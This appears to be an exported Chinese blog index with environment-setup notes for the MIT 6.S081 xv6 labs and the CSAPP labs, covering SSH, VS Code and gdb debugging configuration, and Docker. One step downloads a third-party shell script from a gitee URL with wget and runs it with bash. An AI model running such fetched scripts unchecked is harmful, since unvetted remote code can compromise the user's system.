<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">cd ~</span><br><span class="line">git clone git://g.csail.mit.edu/xv6-labs-2020</span><br><span class="line">cd xv6-labs-2020</span><br><span class="line">git checkout util</span><br><span class="line">make qemu</span><br></pre></td></tr></table></figure>

<h2 id="vscode远程调试"><a href="#vscode远程调试" class="headerlink" title="vscode远程调试"></a>vscode远程调试</h2><p>在vscode上安装remote ssh一系列扩展.</p>
<p>在虚拟机终端输入ifconfig(如果报错就按它的指示去做)并获得地址名得到<strong>inet值</strong></p>
<p>在vscode中的ssh配置文件中加入以下东西：（或者修改）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host	 #造一个名字(随便取)</span><br><span class="line">HostName 	# 输入你得到的地址</span><br><span class="line">User 用户名字	#(ubuntu的账户名字即为username)</span><br></pre></td></tr></table></figure>

<p>在你的windows终端中跑一遍ssh检验是否能够连接虚拟机</p>
<p>打开cmd,输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh username@&lt;inet的地址&gt;</span><br></pre></td></tr></table></figure>

<p>若报以下错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh: connect to host XX.XX.XX.XX port 22: Connection refused</span><br></pre></td></tr></table></figure>

<p>需要开启ssh服务,重启ssh服务(这个报错还挺平凡的,重启下ssh服务一般就能解决)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/ssh start</span><br><span class="line">sudo /etc/init.d/ssh stop</span><br><span class="line">sudo /etc/init.d/ssh start</span><br></pre></td></tr></table></figure>

<p>在vscode中远程连接虚拟机并输入两次密码(在vscode里面远程连接至主机)</p>
<p>用vscode打开xv6-labs-2020文件目录并在目录下创建一个.vscode文件夹</p>
<p>手动新建一个<strong>launch.json</strong>文件,并把以下内容修改username后粘贴</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;(gdb) 启动&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/genesis/xv6-labs-2020/kernel/kernel&quot;</span><span class="punctuation">,</span><span class="comment">//你的kernel所在的目录</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="comment">//可以后续传参</span></span><br><span class="line">        <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//支持断点调试</span></span><br><span class="line">        <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;miDebuggerServerAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost:26000&quot;</span><span class="punctuation">,</span><span class="comment">//这是默认端口</span></span><br><span class="line">        <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/gdb-multiarch&quot;</span><span class="punctuation">,</span><span class="comment">//x86环境支持组件</span></span><br><span class="line">        <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;logging&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;engineLogging&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;programOutput&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span>   </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>修改gdbinit.teml.riscv:(最后一句支持更广泛的断点调试)(<strong>但目前断点调试好像不成功2023.12.8</strong>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set confirm off</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">target remote 127.0.0.1:1234</span><br><span class="line">symbol-file kernel/kernel</span><br><span class="line">set disassemble-next-line auto</span><br><span class="line">set riscv use-compressed-breakpoints yes</span><br></pre></td></tr></table></figure>

<p>在vscode终端启动qemu:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make qemu-gdb</span><br></pre></td></tr></table></figure>

<p>注释gdbinit文件(每次启动qemu都要修改，可以尝试优化)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set confirm off</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">#target remote 127.0.0.1:26000</span><br><span class="line">symbol-file kernel/kernel</span><br><span class="line">set disassemble-next-line auto</span><br><span class="line">set riscv use-compressed-breakpoints yes</span><br></pre></td></tr></table></figure>

<p>按下两次f5并祈祷</p>
<blockquote>
<p>参考教程：</p>
<ol>
<li><p><a href="https://www.bilibili.com/video/BV11K4y127Qk/?spm_id_from=333.337.search-card.all.click&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">MIT 6S081 环境搭建指南 保姆级教学</a></p>
</li>
<li><p><a href="https://www.bilibili.com/video/BV1Lv411g7EV/?spm_id_from=333.788&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">mit6s081 通过vscode来debug kernel</a></p>
</li>
</ol>
</blockquote>
<h1 id="Grade"><a href="#Grade" class="headerlink" title="Grade"></a>Grade</h1><p>如果make grade失败并报错‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;python&#x27;: No such file or directory，</span><br></pre></td></tr></table></figure>

<p>可以进行如下操作</p>
<pre><code>//查看已安装的python版本
python3 --version

//查找python3的位置
whereis python3

//为其创建连接符号(注意观察路径,自己调整)
sudo ln -s /usr/bin/python3 /usr/bin/python
</code></pre>
<h2 id="参考学习资料"><a href="#参考学习资料" class="headerlink" title="参考学习资料"></a>参考学习资料</h2><ol>
<li><a href="https://tarplkpqsm.feishu.cn/docs/doccnBFsXFMsAr1oXEVsaT9E3Jg">一起来学MIT6.S081呀～ - 飞书云文档 (feishu.cn)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/624091268">MIT 6.S081 Operating System  - 知乎 (zhihu.com)</a></li>
<li><a href="https://pdos.csail.mit.edu/6.S081/2020/tools.html">6.S081 &#x2F; Fall 2020 (mit.edu)</a></li>
</ol>
]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP环境配置</title>
    <url>/CSAPP/csapp_environment/2024/01/14/</url>
    <content><![CDATA[<h1 id="Docker安装Csapp环境"><a href="#Docker安装Csapp环境" class="headerlink" title="Docker安装Csapp环境"></a>Docker安装Csapp环境</h1><ol>
<li>打开Docker，打开CMD（windows）或者终端（mac），刷入以下命令拉取镜像。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载镜像</span></span><br><span class="line">docker pull linxi177229/csapp:latest</span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">docker images</span><br><span class="line"><span class="comment"># 启动容器（里面有配置好的环境 和 PDF 资料）</span></span><br><span class="line">docker run --name csapp -itd linxi177229/csapp</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>打开VsCode，在扩展市场安装Docker插件，然后进入，右键对应容器，选择<strong>附加VisualStudioCode</strong>，然后vscode会自动挂载容器，会弹出一个新的窗口。</p>
</li>
<li><p>开始愉快的实验吧！</p>
</li>
<li><p>测试环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 接下来就和使用 平常的 Ubuntu：20.04 一样了</span><br><span class="line"># 进入 lab1 进行一个简单的测试</span><br><span class="line">cd ~</span><br><span class="line">ls</span><br><span class="line">cd csapplab</span><br><span class="line">cd datalab/datalab-handout</span><br><span class="line">make clean &amp;&amp; make &amp;&amp; ./btest</span><br></pre></td></tr></table></figure>
</li>
<li><p>GDB安装（bomblab需要使用）</p>
</li>
</ol>
<p>在这个doker中默认是没有安装gdb的,所以为了在bomblab中进行gdb的使用,我们需要在doker中安装gdb,该doker镜像是基于ubuntu20.04的,故我们直接在终端使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install  gdb</span><br></pre></td></tr></table></figure>

<p>安装好后,cd到bomb的文件夹内,输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br></pre></td></tr></table></figure>

<p>然后开始实验吧!<del>这个点废了我一个晚上才弄明白</del></p>
<h1 id="Ubuntu安装CSAPP环境"><a href="#Ubuntu安装CSAPP环境" class="headerlink" title="Ubuntu安装CSAPP环境"></a>Ubuntu安装CSAPP环境</h1><ol>
<li><p>虚拟机 安装 Ubuntu20.04，这个比较简单，找一篇博客就行，**不过记得用 VMware pro 16，很方便 ssh，</p>
</li>
<li><p>CSAPP 环境配置，首先如果你用的是 Ubuntu20.04 及以下，那么你可以直接运行下面的脚本，就可以安装好 操作都很简单，就几行命令而已，Docker 方法适用性更加广，目前大多数操作系统都支持。</p>
</li>
</ol>
<p>这个脚本是 20.04 及以下都可以完全配置好的，并且有附带的 PDF，如果是 Ubuntu 21及 以上需要在 lab4 的时候降低 gcc 版本。</p>
<p>选择自己想要做项目的文件夹,cd到文件夹中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载脚本</span></span><br><span class="line">wget https://gitee.com/lin-xi-269/csapplab/raw/origin/installAll.sh </span><br><span class="line"><span class="comment"># 运行脚本</span></span><br><span class="line">bash installAll.sh </span><br></pre></td></tr></table></figure>

<ol start="3">
<li>运行完 这个脚本之后，<strong>会在 当前目录下创建一个 csapp 文件夹，里面包含 8个 lab 按照 PDF 开始做即可以开始做了。</strong></li>
</ol>
<p>然后可以用vscode远程链接ubuntu,通过ssh,然后测试环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 接下来就和使用 平常的 Ubuntu：20.04 一样了</span><br><span class="line"># 进入 lab1 进行一个简单的测试</span><br><span class="line">cd ~</span><br><span class="line">ls</span><br><span class="line">cd csapplab</span><br><span class="line">cd datalab/datalab-handout</span><br><span class="line">make clean &amp;&amp; make &amp;&amp; ./btest</span><br></pre></td></tr></table></figure>

<h1 id="环境安装时的截图"><a href="#环境安装时的截图" class="headerlink" title="环境安装时的截图"></a>环境安装时的截图</h1><p>~~下面的截图是包括了用docker配置xv6环境</p>
<h2 id="CMD截图"><a href="#CMD截图" class="headerlink" title="CMD截图"></a>CMD截图</h2><p><a href="https://pic.imgdb.cn/item/65a3b395871b83018aa824cd.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315215.jpg"></a></p>
<h2 id="Docker截图"><a href="#Docker截图" class="headerlink" title="Docker截图"></a>Docker截图</h2><p><a href="https://pic.imgdb.cn/item/65a3b5d3871b83018aafffff.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315227.jpg"></a></p>
<h2 id="Vscode截图"><a href="#Vscode截图" class="headerlink" title="Vscode截图"></a>Vscode截图</h2><p><a href="https://pic.imgdb.cn/item/65a3b64c871b83018ab1ab98.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315236.jpg"></a></p>
<blockquote>
<p>配置环境主打一个能用就好，不要过多的纠结。</p>
</blockquote>
<h1 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h1><blockquote>
<p>菜就多练，输不起就别玩</p>
<p><a href="https://pic.imgdb.cn/item/65a3b50a871b83018aad5026.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315248.jpg"></a></p>
</blockquote>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
</search>
